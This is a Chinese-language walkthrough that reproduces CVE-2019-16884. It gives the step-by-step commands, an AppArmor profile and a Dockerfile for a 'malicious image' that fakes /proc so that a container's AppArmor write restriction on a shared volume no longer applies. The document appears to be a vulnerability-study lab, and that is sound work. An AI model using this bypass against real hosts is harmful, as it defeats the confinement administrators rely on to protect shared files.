# CVE-2019-16884 复现

## 环境

* Linux: Ubuntu 18.04
* Docker: 19.03.2
* containerd: 1.2.6

## 步骤

假设宿主和容器共享某个目录，宿主可以读写该目录中的文件，而容器则只能读取不能写入。创建一个AppArmor的配置文件（[testprofile](testprofile)）：

```
#include <tunables/global>

profile testprofile flags=(attach_disconnected,mediate_deleted) {
    #include <abstractions/base>
    file,
    deny /vol/** w,
}
```

其中， `deny /vol** w` 表示不允许/vol目录下的文件写入操作。然后将该配置文件加载到内核：

```shell
sudo apparmor_parser -a ./testprofile
```

在当前目录下（例如/home/abc/）创建一个vol目录，然后创建一个容器，将这个目录挂载到容器中：

```shell
sudo docker run -it --rm --security-opt "apparmor=testprofile" -v /home/abc/vol:/vol ubuntu:bionic-20221215 bash
```

尝试向/vol目录创建文件，可以发现没有写入的权限：

![](img/16884_write_denied.png)

回到宿主，创建一个root目录，模拟容器的根目录，并在其中创建proc目录，模拟容器的procfs：

```shell
mkdir -p root/proc/self/attr
mkdir root/proc/self/fd
touch root/proc/self/status
touch root/proc/self/attr/exec
touch root/proc/self/fd/4
touch root/proc/self/fd/5
```

创建一个[Dockerfile](Dockerfile)，将刚刚创建的root目录复制到容器根目录，并挂载/proc卷：

```dockerfile
FROM ubuntu:bionic-20221215
ADD root /
VOLUME /proc
```

构建恶意镜像：

```shell
sudo docker build -t malimage .
```

基于该镜像创建一个容器：

```shell
sudo docker run -it --rm --security-opt "apparmor=testprofile" -v /home/abc/vol:/vol malimage bash
```

再次尝试向/vol写入文件，这次可以成功写入：

![](img/16884_write_success.png)